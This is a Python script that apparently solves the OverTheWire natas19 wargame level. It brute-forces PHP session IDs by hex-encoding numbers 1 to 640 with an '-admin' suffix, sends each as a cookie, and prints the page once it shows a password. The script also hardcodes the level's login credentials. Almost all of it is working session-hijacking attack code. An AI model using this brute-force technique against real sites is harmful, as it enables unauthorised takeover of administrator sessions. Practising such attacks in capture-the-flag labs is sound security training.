import requests

url = "http://natas19.natas.labs.overthewire.org/index.php?debug"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "http://natas19.natas.labs.overthewire.org",
    "Connection": "keep-alive",
    "Referer": "http://natas1.natas.labs.overthewire.org/",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1",
    "Sec-GPC": "1"
}

session = requests.Session()

for id in range(1, 641):

    ascii_string = str(id)  # Convert to string
    bytes_object = ascii_string.encode("ascii")  # Convert to bytes
    hex_string = bytes_object.hex()  # Convert to hexadecimal string
    # print(hex_string)

    cookies = dict(PHPSESSID=hex_string+"2d61646d696e")  # -admin

    response = session.get(url, headers=headers, cookies=cookies, auth=auth)

    if response.status_code == 200:
        # print(response.headers)
        # print(response.text)
        if "Password:" in response.text:
            print(hex_string)
            print(response.text)
            exit()
